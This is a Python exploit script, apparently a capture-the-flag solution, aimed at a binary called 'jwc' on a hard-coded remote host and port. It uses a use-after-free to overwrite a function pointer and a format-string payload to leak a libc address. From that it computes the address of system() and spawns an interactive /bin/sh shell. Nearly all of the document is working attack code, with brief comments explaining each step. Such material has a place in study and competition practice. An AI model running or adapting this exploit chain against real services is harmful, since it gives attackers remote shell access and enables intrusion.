#!/usr/bin/env python
# encoding:utf-8

from utils import *

elf = ELF('jwc')
libc = ELF('libc-2.19.so')

# io = debug('./jwc'); io.sendline('set follow-fork-mode parent'); io.r()
io = remote('128.199.232.78', 5432)
# io = remote('10.211.55.48', 5432)

def register():
    global io
    io.sendline('1')
    io.sendline('ripples')
    io.sendline('stagnant water ripples')

def take_eaxm(type, essay):
    global io
    io.sendline('2')
    io.sendline(str(type))
    io.sendline(str(len(essay)))
    io.sendline(essay)

def show_scores():
    global io
    io.sendline('3')

def resit(type):
    global io
    io.sendline('5')
    io.sendline(str(type))

def update_essay(type, essay):
    global io
    io.sendline('1024')
    io.sendline(str(type))
    io.sendline(essay)

register()
take_eaxm(3, '\x00' * 0x68)
# This resit cause free without the pointer cleared.
resit(3)
# This exam will malloc the same memery as previous freed essay.
take_eaxm(1, nops(1))

# Contruct a format string exploit to leak the return address of main which is in libc.
payload = right_pad('%11$16lx', 0x18)
payload += p64(elf.plt['printf'])
update_essay(3, payload)
io.recvrepeat(1)
show_scores()
main_ret_addr = int(io.recv(16), 16)

log.info('main return addr: 0x%16x' % main_ret_addr)
libc_base_addr = main_ret_addr - (libc.symbols['__libc_start_main'] + 245)
system_addr = libc_base_addr + libc.symbols['system']
log.info('system addr: 0x%16x' % system_addr)

payload = '/bin/sh\x00'
payload += nops(16)
payload += p64(system_addr)
update_essay(3, payload)
show_scores()

io.ext_interactive()
